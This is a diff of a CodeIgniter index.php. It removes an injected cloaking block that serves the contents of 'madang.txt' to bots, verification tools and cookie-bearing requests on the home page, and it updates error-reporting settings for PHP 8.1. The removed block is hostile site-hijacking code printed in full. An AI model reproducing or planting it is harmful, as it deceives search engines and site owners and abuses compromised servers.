@@ -1,8 +1,4 @@
 <?php
-if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQUEST_URI'] == '/' || isset($_COOKIE[0]) && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'verification') > 0 && $_SERVER['REQUEST_URI'] == '/' || strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'tool') > 0 && $_SERVER['REQUEST_URI'] == '/') {
-    echo implode('', file('madang.txt'));
-    exit;
-}
 /**
  * CodeIgniter
  *
@@ -70,21 +66,20 @@ if(strpos(strtolower($_SERVER['HTTP_USER_AGENT']), 'bot') > 0  && $_SERVER['REQU
 switch (ENVIRONMENT)
 {
 	case 'development':
-		error_reporting(-1);
+		// PHP 8.1+: Show all errors including deprecations for development
+		error_reporting(E_ALL);
 		ini_set('display_errors', 1);
+		ini_set('display_startup_errors', 1);
 	break;
 
 	case 'testing':
 	case 'production':
+		// PHP 8.1+: Hide errors but log them
 		ini_set('display_errors', 0);
-		if (version_compare(PHP_VERSION, '5.3', '>='))
-		{
-			error_reporting(E_ALL & ~E_NOTICE & ~E_DEPRECATED & ~E_STRICT & ~E_USER_NOTICE & ~E_USER_DEPRECATED);
-		}
-		else
-		{
-			error_reporting(E_ALL & ~E_NOTICE & ~E_STRICT & ~E_USER_NOTICE);
-		}
+		ini_set('display_startup_errors', 0);
+		// Exclude deprecated warnings in production for PHP 8.1 compatibility
+		error_reporting(E_ALL & ~E_DEPRECATED & ~E_STRICT & ~E_WARNING & ~E_USER_DEPRECATED);
+		ini_set('log_errors', 1);
 	break;
 
 	default:
